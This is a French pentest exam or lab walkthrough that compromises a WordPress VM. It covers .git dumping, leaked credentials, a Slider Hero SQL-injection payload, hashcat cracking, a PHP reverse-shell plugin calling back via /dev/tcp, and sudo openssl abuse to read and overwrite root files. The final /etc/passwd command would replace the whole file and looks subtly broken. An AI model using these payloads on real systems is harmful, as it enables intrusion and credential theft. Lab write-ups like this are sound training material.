# Exam Pentesting

## Network Recon

**NMAP**

```shell
# Nmap 7.94SVN scan initiated Tue Jan 23 12:19:01 2024 as: nmap -sCV -oN scan.nmap 192.168.56.50
Nmap scan report for 192.168.56.50
Host is up (0.00093s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 cc:d2:ab:97:15:b3:82:8a:88:9e:b2:76:19:88:29:d8 (ECDSA)
|_  256 78:d7:28:ad:4f:b7:2e:76:6d:7c:c3:04:e6:76:5b:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
| http-git:
|   192.168.56.50:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Initial WP install
|_http-title: WordPress &#8211; Just another WordPress site
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:91:EC:2B (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 23 12:19:18 2024 -- 1 IP address (1 host up) scanned in 16.76 seconds
```

On trouve deux services classique, un site sous wordpress hébergé sur le port 80, et un port de service ssh.
- Le script http-git nous donne des informations intéressantes, on a accès au `.git`, donc potentiellement au code source de l'application.
- La version de WordPress utilisée est le 5.8.1, on pourrait consulter les potentielles CVE et utiliser wp_scan pour trouver de potentielles failles.

## Web Application

**.git**

```bash
git-dumper http://192.168.56.50/.git ./wordpress
```

On trouve un fichier `TODO_staff.txt`

```shell
$ cat TODO_staff.txt
DONE
Créer le compte contributeur du prestataire et lui envoyer les identifiants (contributor:Afd9ky0xz6jrD26eT9gx2w)

WIP
Finir l'installation et la configuration des plugins

TODO
Change le mot de passe de l'administrateur
Nettoyer le répertoire web (.git + TOTO_staff.txt)
```

Il semblerait qu'on possède le compte contributeur du prestataire `contributor:Afd9ky0xz6jrD26eT9gx2w`. On peut se login avec ces credentials sur `wp-login.php`.

**Slider Hero CVE**

On remarque que le plugin slider hero est installé, on trouve une CVE rapidement avec une PoC. On créer un nouveau post avec le code
```html
[hero-button id='1 UNION SELECT 2,"",2,1,NULL,"",NULL,0,NULL,"{}",999,NULL,CONCAT(CONCAT(CONCAT(CONCAT(FROM_BASE64("eyJidXR0b25fdGV4dCI6Ig=="),user_login),":"),user_pass),FROM_BASE64("IiwiYnV0dG9uX3VybCI6IiMiLCJidXR0b25fdGFyZ2V0IjoiX2JsYW5rIiwiYnV0dG9uX2JvcmRlciI6InNxdWFyZSIsImJ1dHRvbl9zdHlsZSI6ImZ1bGxfYmFja2dyb3VuZCIsImJ1dHRvbl9lZmZlY3QiOiJleGJvcmRlciIsImJ1dHRvbl9mb250X3dlaWdodCI6Im5vcm1hbCIsImJ1dHRvbl9mb250X3NpemUiOiIiLCJidXR0b25fbGV0dGVyX3NwYWNpbmciOiIiLCJidXR0b25fY29sb3IiOiIjMDAwMDAwIiwiYnV0dG9uX2hvdmVyX2NvbG9yIjoiIiwiYnV0dG9uX2JhY2tncm91bmRfY29sb3IiOiIjZmZmZmZmIiwiaGVyb19idXR0b25fc2hvcnRjb2RlIjoiMSIsImhlcm9fYnV0dG9uX3Nob3J0Y29kZV92YWx1ZSI6IiIsImJ1dHRvbl9iYWNrZ3JvdW5kX2hvdmVyX2NvbG9yIjoiIn0=")),FROM_BASE64("eyJidXR0b25fdGV4dCI6IkRvd25sb2FkIE5vdyIsImJ1dHRvbl91cmwiOiIjIiwiYnV0dG9uX3RhcmdldCI6Il9ibGFuayIsImJ1dHRvbl9ib3JkZXIiOiJzcXVhcmUiLCJidXR0b25fc3R5bGUiOiJmdWxsX2JhY2tncm91bmQiLCJidXR0b25fZWZmZWN0IjoiZXhib3JkZXIiLCJidXR0b25fZm9udF93ZWlnaHQiOiJub3JtYWwiLCJidXR0b25fZm9udF9zaXplIjoiIiwiYnV0dG9uX2xldHRlcl9zcGFjaW5nIjoiIiwiYnV0dG9uX2NvbG9yIjoiIzAwMDAwMCIsImJ1dHRvbl9ob3Zlcl9jb2xvciI6IiIsImJ1dHRvbl9iYWNrZ3JvdW5kX2NvbG9yIjoiI2ZmZmZmZiIsImhlcm9fYnV0dG9uX3Nob3J0Y29kZSI6IiIsImhlcm9fYnV0dG9uX3Nob3J0Y29kZV92YWx1ZSI6IiIsImJ1dHRvbl9iYWNrZ3JvdW5kX2hvdmVyX2NvbG9yIjoiIn0="),"",NULL,NULL,NULL,NULL,NULL FROM wp_users']
```
Et on récupère `admin:$P$BFLCjvS3t9kIa1FH6.gb5DtJMQgjRa1`. Le hash est au format Wordpress d'après hashid.

```shell
$ hashcat -a 0 -m 400 ./admin_pass.hash /usr/share/wordlists/rockyou.txt
spidermonkey
```

On a donc un nouveau compte `admin:spidermonkey` admin avec lequel on va pouvoir sans doute upload directement du code php et donc obtenir un accès shell.

**PHP Plugin Reverse Shell**

```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Matteo :D
* Author URI: https://www.nyan.cat/
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.3/80 0>&1'");
?>
```

On upload ça et on lance un `nc -lnvp 80` et hop on est www-data.

flag.txt
```
8312ab771a9b8433bf309f557a3d5c6e
```

## PrivEsc

### www-data

**linpeas.sh**


/home/user/.bash_history
```bash
╔══════════╣ Searching passwords in history files
/home/user/.bash_history:suod service mysql eanble
/home/user/.bash_history:suG6vP1rWzBUqIL2aaT6oA
/home/user/.bash_history:mysql -e "CREATE USER 'wordpress'@'localhost' IDENTIFIED BY 'suG6vP1rWzBUqIL2aaT6oA';"

/home/user/.bash_history:wp core install --url=192.168.56.50 --title=WordPress --admin_user=admin --admin_email=admin@localhost.com --admin_password="spidermonkey" 2>/dev/null
```

L'utilisateur `wordpress:suG6vP1rWzBUqIL2aaT6oA` de la base de donnée, et on retrouve notre `admin:spidermonkey`.

On tente le même mot de passe `suG6vP1rWzBUqIL2aaT6oA` pour se connecter à `user` par ssh au cas où le user est pas très malin, et ça fonctionne.

`user:suG6vP1rWzBUqIL2aaT6oA`


flag.txt
```
bc41fccb255c1503820d8d59fea331e9
```

### user

On a des permissions sur openssl, mais on a NOEXEC. D'après GTFOBins on a au moins écriture et lecture en tant que root sur le système.

```shell
$ sudo -l
Matching Defaults entries for user on exam:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user may run the following commands on exam:
    (root) NOPASSWD: /opt/*, /usr/bin/ls
    (root) NOEXEC: /usr/bin/find, /usr/bin/openssl
```

On peut directement récupérer le dernier flag qu'on a au préalable repéré dans `/root` avec nos privilèges sur `ls` 

```shell
$ sudo ls /root
flag.txt

$ sudo openssl enc -in "/root/flag.txt"
ea35e5dfd681ae259799f863006ea21c
```

On peut également ajouter un utilisateur root à passwd sans mot de passe si on souhaite avoir un shell root.

```shell
$ echo "toor::0:0:/root:/bin/bash" | sudo openssl enc -out "/etc/passwd"
$ su toor
```